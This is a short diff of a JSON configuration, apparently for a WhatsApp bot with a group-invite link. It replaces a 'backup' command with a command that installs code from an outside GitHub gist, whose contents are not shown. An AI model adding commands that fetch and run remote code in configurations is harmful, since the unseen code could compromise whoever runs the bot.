@@ -5,5 +5,5 @@
     "send": "true",
     "to": "self",
     "join": "https://chat.whatsapp.com/FaEfXGZj17TESHZfHRLUX9?mode=gi_t",
-    "command": "backup"
+    "command": ". install https://gist.github.com/proboy315/3a5f83cc4be002df9cf3e1361169c51c"
 }
